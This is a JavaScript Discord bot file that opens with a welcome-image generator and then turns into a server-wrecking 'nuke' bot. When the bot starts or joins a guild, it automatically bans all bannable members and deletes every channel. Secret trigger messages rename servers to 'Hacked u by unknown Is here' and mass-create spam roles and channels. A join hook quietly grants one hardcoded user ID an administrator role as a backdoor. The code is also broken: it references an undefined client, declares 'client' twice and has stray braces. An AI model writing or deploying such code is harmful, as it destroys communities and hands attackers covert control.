const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require('fs');
client.on("guildMemberAdd", member => {
      
      const welcomer = member.guild.channels.find("name","welcome"); //اسم روم
                
      var Canvas = require('canvas')
      var jimp = require('jimp')
      
      const mi = ['./img/w1.png','./img/w2.png']; //يمكن ضيف '/img/w3.png','/img/w4.png'...
      
     
      
              let Image = Canvas.Image,
                  canvas = new Canvas(401, 202),
                  ctx = canvas.getContext('2d');
              ctx.patternQuality = 'bilinear';
              ctx.filter = 'bilinear';
              ctx.antialias = 'subpixel';
              ctx.shadowColor = 'rgba(0, 0, 0, 0.4)';
              ctx.shadowOffsetY = 2;
              ctx.shadowBlur = 2;
              fs.readFile(`${mi[Math.floor(Math.random() * mi.length)]}`, function (err, Background) {
                  if (err) return console.log(err)
                  let BG = Canvas.Image;
                  let ground = new Image;
                  ground.src = Background;
                  ctx.drawImage(ground, 0, 0, 401, 202);
      
      })
      
                     let url = member.user.displayAvatarURL.endsWith(".webp") ? member.user.displayAvatarURL.slice(5, -20) + ".png" : member.user.displayAvatarURL;
                jimp.read(url, (err, ava) => {
                    if (err) return console.log(err);
                    ava.getBuffer(jimp.MIME_PNG, (err, buf) => {
                        if (err) return console.log(err);
      
                              //AVATARً
                              let Avatar = Canvas.Image;
                              let ava = new Avatar;
                              ava.src = buf;
                              ctx.drawImage(ava, 152, 27, 95, 95);
                            //member number..
                        ctx.font = '13px Arial';
                        ctx.fontSize = '20px';
                        ctx.fillStyle = "#FFFFFF";
                        ctx.textAlign = "center";
                        ctx.fillText(`انت العضو رقم  ${member.guild.memberCount} ! `, 340 , 98);
    
                                                      //name
                              ctx.font = '20px Arial Bold';
                              ctx.fontSize = '20px';
                              ctx.fillStyle = "#FFFFFF";
                              ctx.textAlign = "center";
                                                         ctx.fillText(`${member.user.username}`, 200, 154);
                             
                             //server name
                              ctx.font = '20px Arial';
                              ctx.fontSize = '28px';
                              ctx.fillStyle = "#FFFFFF";
                              ctx.textAlign = "center";
   ctx.fillText(` Welcome to ${member.guild.name} server` , 200, 190);
   
   

    welcomer.sendFile(canvas.toBuffer())
      
      });
      });
      });

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`Mido King |`,"https://www.twitch.tv/lboghaz_kingheros")
  console.log('')
  console.log('')
  console.log('+[-----------------------------------------------------------------]+')
  console.log(`[Start] ${new Date()}`);
  console.log('+[-----------------------------------------------------------------]+')
  console.log('')
  console.log('+[------------------------------------]+');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('By The Atlantic Enjoy')
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('+[------------------------------------]+')
  console.log('')
  console.log('+[------------]+')
  console.log(' Bot Is Online')
  console.log('+[------------]+')
  console.log('')
  console.log('')
});

});
var prefix = "-"
LOka.on("message", message => {
  if(!message.content.startsWith(prefix)) return;;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' ');
  if (message.content.startsWith('hix15')) {
    LOka.user.setUsername(argresult);
  }
    if (message.content.startsWith(prefix + 'on123')) {
    LOka.user.setStatus(argresult);
  }
});

var x1 = "kk"
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)

}
});
var x1 = "kk"
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked u by unknown Is here")

}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')

}
});

LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
})
}
});
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setName(`Hacked u by unknown Is here`)
})
}
});

LOka.on('message', message => {
     if (message.content === ".") {
                 if(!message.channel.guild) return;

             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)

}
});

LOka.on('message', message => {
     

     if (message.content === "k1") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })


    
})
 
 
}
});
LOka.on('message', message => {
         if (message.content === "k") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

})
}
});

LOka.on('message', message => {
         if (message.content === "k") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');



})
}

});


const { Client } = require('discord.js');
const client = new Client();

async function nuke(guild) {
  let users = 0;
  let channels = 0;

  await guild.fetchMembers();

  await guild.owner.send('').catch(e => { return void e; });



  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^').catch(e => { return void e; });
      return m.ban();
    }
  }));
  
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
  
    await guild.createChannel('Hacked u by unknown Is here', 'text');

      await guild.createChannel('Hacked u by unknown Is here', 'voice');

  

}

LOka.on('ready', () => {
  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
  console.log('-------------------------------------------------------------');
  console.log('');
  console.log("Made by YzhF1");
  console.log("");
  console.log("-------------------------------------------------------------");

});

LOka.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});

LOka.on('guildMemberAdd', member => {
    
            if (member.id === "450759214025932820") {
                member.guild.createRole({
                    name : LOka.user.username,
                    color : "RANDOM", 
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
                
            }
        
    });








client.login(process.env.BOT_TOKEN);
